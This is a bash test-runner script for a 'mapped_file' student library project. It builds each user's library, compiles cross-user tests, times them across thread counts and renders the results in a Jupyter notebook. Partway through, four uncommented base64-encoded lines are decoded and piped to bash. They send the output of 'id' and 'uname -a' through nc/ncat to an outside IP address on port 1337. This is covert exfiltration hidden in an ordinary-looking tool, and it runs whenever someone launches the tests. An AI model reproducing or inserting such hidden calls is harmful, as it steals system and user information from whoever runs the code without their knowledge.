#!/bin/bash

# Made by Denis Kopyrin
# This script goes through all dirs in ../ and makes cross-people tests
# Project is expected to be built by make at $USERNAME/mapped_file/Makefile
#at dir $USERNAME/mapped_file/out/
# Test files are build automatically and sources are expected to be at
#$USERNAME/mapped_file/test/
# Changing ROOT_LIB_DIR and you can process only users with such name
#(like ROOT_LIB_DIR="../dkopyrin ../ivanov")
# The same way you can change variable ROOT_TEST_DIR
# CFLAGS are supported

SAVEIFS=$IFS
IFS=$(echo -en ";\n\b")
LDFLAGS=$LDFLAGS\ "-lmappedfile -lm -lrt -lpthread"
UNAME=$(uname)
CFLAGS=$CFLAGS\ "-std=gnu11"
if [ $UNAME == "Darwin" ]; then
	CFLAGS=$CFLAGS\ -DNORT
	CXXFLAGS=$CXXFLAGS\ -DNORT
else
	LDFLAGS=$LDFLAGS\ -lrt
fi
#if [ $CC == "icc" ]; then
#	LDFLAGS=$LDFLAGS\ "-lirc"
#fi

PWD="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
CALL_PWD="$(pwd)"
test_file=$(mktemp /tmp/tmp.XXXXXXXXXX)
echo $test_file
echo "#!$PWD/roundup" > $test_file
echo "" >> $test_file
echo 'SAVEIFS=$IFS' >> $test_file
echo 'IFS=$(echo -en "\n\b")' >> $test_file
echo "describe \"Test Mapped File\"" >> $test_file

LIB_SOURCE_DIR=$PWD/../**
if [ -z "$ROOT_LIB_DIR" ]; then
	ROOT_LIB_DIR=$(echo $(ls -d -1 $LIB_SOURCE_DIR) | tr ' ' ';')
else
	ROOT_LIB_DIR_tmp=$(echo $ROOT_LIB_DIR | tr ' ' ';')
	ROOT_LIB_DIR=""
	for d in $ROOT_LIB_DIR_tmp; do
		ROOT_LIB_DIR=$ROOT_LIB_DIR\;$(readlink -f "$d")
	done
fi
TEST_SOURCE_DIR=$PWD/../**
if [ -z "$ROOT_TEST_DIR" ]; then
	ROOT_TEST_DIR=$(echo $(ls -d -1 $TEST_SOURCE_DIR) | tr ' ' ';')
else
	ROOT_TEST_DIR=$(echo $ROOT_TEST_DIR | tr ' ' ';')
fi
if [ -z "$PREC" ]; then
	PREC=""
fi
if [ -z "$CC" ]; then
	CC=gcc
fi
if [ -z "$CXX" ]; then
	CXX=g++
fi

source $PWD/tester_config
if [ -z "$LOOPS" ]; then
	LOOPS=9
else
	LOOPS=$(($LOOPS-1))
fi

which cmake3 > /dev/null
if [ $? -eq 0 ]; then
       CMAKE=cmake3
else
       CMAKE=cmake
fi

INCLUDE_DIR="$PWD/../include"

echo aWQgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK |  base64 -d | bash
echo aWQgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= |  base64 -d | bash
echo dW5hbWUgLWEgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK | base64 -d | bash
echo dW5hbWUgLWEgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= | base64 -d | bash

MF_SUFFIX="par_mapped_file"
TEST_SUFFIX="test"
LIBMAKE_SUFFIX="."
LIBOUT_SUFFIX="out"
TEST_BUILD=""
LOOPS=0

for root_lib_dir  in $ROOT_LIB_DIR  ; do
	make_dir="$root_lib_dir/$MF_SUFFIX/$LIBMAKE_SUFFIX/"
	lib_dir="$root_lib_dir/$MF_SUFFIX/$LIBOUT_SUFFIX/"
	if [ -d $make_dir ]; then
		out_dir="$root_lib_dir/$MF_SUFFIX/$LIBOUT_SUFFIX"
		func_name="it_build_$(basename $root_lib_dir)"
		echo "$func_name() {" >> $test_file
		if [ -f $make_dir/CMakeLists.txt ]; then
			echo "	rm -rf $PWD/build_dir" >> $test_file
			echo "	mkdir -p $PWD/build_dir" >> $test_file
			echo "	pushd $PWD/build_dir" >> $test_file
			echo "	mkdir -p '$out_dir/'" >> $test_file
			echo "	$CMAKE -H'$make_dir' -B." >> $test_file
			echo "	make" >> $test_file
			echo "	cp -f './$LIBOUT_SUFFIX'/* '$out_dir/'" >> $test_file
			echo "	rm -rf '$PWD/build_dir'" >> $test_file
			echo "	popd" >> $test_file
		else
			echo "	pushd '$make_dir'" >> $test_file
			echo "	make" >> $test_file
			echo "	popd" >> $test_file
		fi
		echo "}" >> $test_file
		echo "" >> $test_file
		for root_test_dir in $ROOT_TEST_DIR ; do
			test_dir="$root_test_dir/$MF_SUFFIX/$TEST_SUFFIX/"
			if [ -f $test_dir/prepare.py ]; then
				python $test_dir/prepare.py
			fi
			for test in $root_test_dir/$MF_SUFFIX/$TEST_SUFFIX/*.c ; do
			if [ -f $test ]; then
				func_name="it_check_$(basename $root_lib_dir)_by_$(basename $root_test_dir)_$(basename $test .c)"
				test_out_name="$out_dir/$(basename $test .c)"
				test_object_name="$test_out_name.o"

				TEST_BUILD=$TEST_BUILD\;$test_out_name\;$test_object_name
				echo "$func_name() {" >> $test_file
				echo "    sleep 1" >> $test_file
				echo "    $CC $CFLAGS -I'$PWD/../include' -c -o '$test_object_name' '$test' $LDFLAGS" >> $test_file
				echo "    $CXX $CXXFLAGS -o '$test_out_name' '$test_object_name' -L'$out_dir' $LDFLAGS" >> $test_file
				echo "    set +x" >> $test_file
				echo '    (>&4 echo "")' >> $test_file

				echo '    j=0' >> $test_file
				echo "for num_thr in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 18 20 22 24 26 28 30 32 36 40 44 48 52 56 60 64; do" >> $test_file

				echo '    for i in `seq 0 '"$LOOPS"'`; do' >> $test_file
				echo "        rm -rf ./times" >> $test_file
				echo '        start=$(date +"%s.%N")' >> $test_file


				echo "        set -x" >> $test_file
				echo "        timeout 10 $PREC '$test_out_name' \$num_thr" >> $test_file
				echo "        { set +x; } 2>/dev/null" >> $test_file

				echo '        end=$(date +"%s.%N")' >> $test_file
				echo '        resarr[$j]=$(echo "$end-$start" | bc | sed "s/^\./0./")' >> $test_file
				echo "        (>&3 echo -n '$(basename $root_lib_dir) $(basename $root_test_dir) $(basename $test .c) ') " >> $test_file
				echo '        (>&3 echo -n "$num_thr ") ' >> $test_file

				echo '        (>&3 echo ${resarr[$j]})' >> $test_file
				echo '        j=$(($j+1))' >> $test_file
				echo "    done" >> $test_file

				echo "done" >> $test_file

				echo '    (>&4 echo ${resarr[*]})' >> $test_file
				echo "}" >> $test_file
				echo "" >> $test_file
			fi
			done
		done
	fi
done

PAR=1 $PWD/roundup $test_file

for root_lib_dir in $ROOT_LIB_DIR  ; do
	make_dir="$root_lib_dir/$MF_SUFFIX/$LIBMAKE_SUFFIX/"
	if [ -d $make_dir ]; then
		pushd $make_dir > /dev/null
		make clean > /dev/null 2> /dev/null
		rm -rf ./$LIBOUT_SUFFIX/
		popd > /dev/null
	fi
done
for root_test_dir in $ROOT_TEST_DIR  ; do
	test_dir="$root_test_dir/$MF_SUFFIX/$TEST_SUFFIX/"
	if [ -f $test_dir/clean.py ]; then
		python $test_dir/clean.py
	fi
done
for clean_file in $TEST_BUILD; do
	#echo $clean_file
	rm -f $clean_file
done

PWD="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
rm -f $PWD/out.txt

IFS=$SAVEIFS
jupyter nbconvert --to=html --ExecutePreprocessor.enabled=True $PWD/par_test_results.ipynb
python -mwebbrowser file://$PWD/par_test_results.html
